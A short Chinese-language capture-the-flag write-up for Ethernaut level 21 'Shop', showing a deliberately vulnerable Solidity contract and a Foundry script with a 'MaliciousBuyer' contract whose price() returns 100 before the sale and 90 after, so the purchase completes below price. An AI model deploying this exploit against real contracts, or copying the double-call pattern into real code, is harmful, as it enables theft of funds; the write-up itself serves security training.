# Ethernaut CTF Writeup

## Level 21 Shop

> 題目: https://ethernaut.openzeppelin.com/level/0xDc0c34CFE029b190Fc4A6eD5219BF809F04E57A3

原始碼:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

過關條件: 

- 用低於指定的價格買到商品

解法：

- 在第一次呼叫與第二次呼叫時給出不同結果
    - 第一次呼叫(檢查價格)：回傳指定價格
    - 第二次呼叫(結帳)：回傳較低價格

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Shop} from "../src/level21/Shop.sol";

contract MaliciousBuyer {
    Shop private immutable shop;

    constructor(address _target) {
        shop = Shop(_target);
    }

    function exploit() external {
        shop.buy();
    }

    function price() external view returns (uint256) {
        if (!shop.isSold()) {
            return 100;
        } else {
            return 90;
        }
    }
}

contract Attack is Script {
    MaliciousBuyer buyer;
    function run() public {
        vm.startBroadcast();

        buyer = new MaliciousBuyer(0x1386aDf9BD9cCF152F952d2CF5F45901d8067b1e);
        buyer.exploit();

        vm.stopBroadcast();
    }
}
```